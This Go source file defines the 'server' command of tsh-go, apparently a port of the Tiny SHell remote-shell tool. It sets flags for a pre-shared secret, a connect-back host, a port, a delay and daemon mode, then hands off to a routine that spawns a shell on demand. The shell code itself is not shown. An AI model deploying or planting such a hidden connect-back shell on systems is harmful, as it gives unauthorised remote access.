package cmd

import (
	"tsh-go/internal/tshd"

	"github.com/spf13/cobra"
)

func init() {
	serverCmd.PersistentFlags().StringVarP(&serverSecret, "secret", "s", "konpeko", "Pre-shared secret for encryption")
	serverCmd.PersistentFlags().StringVarP(&serverConnectBackHost, "cbhost", "c", "", "Connect-back host")
	serverCmd.PersistentFlags().IntVarP(&serverPort, "port", "p", 2413, "Target port")
	serverCmd.PersistentFlags().IntVarP(&serverConnectBackDelay, "delay", "", 5, "Connect-back delay")
	serverCmd.PersistentFlags().BoolVarP(&serverIsDaemon, "daemon", "d", false, "Run as daemon")
	rootCmd.AddCommand(serverCmd)
}

var serverConnectBackHost string
var serverSecret string
var serverPort int
var serverConnectBackDelay int
var serverIsDaemon bool

var serverCmd = &cobra.Command{
	Use:   "server [flags]",
	Args:  cobra.NoArgs,
	Short: "Tiny SHell server",
	Long: `Tiny SHell server, listen for incoming connections and spawn a shell on demand.

Examples:
  tsh server
  tsh server -s hello -p 1337`,
	Run: func(cmd *cobra.Command, args []string) {
		tshd.Run(serverSecret, serverConnectBackHost, serverPort, serverConnectBackDelay, serverIsDaemon)
	},
}
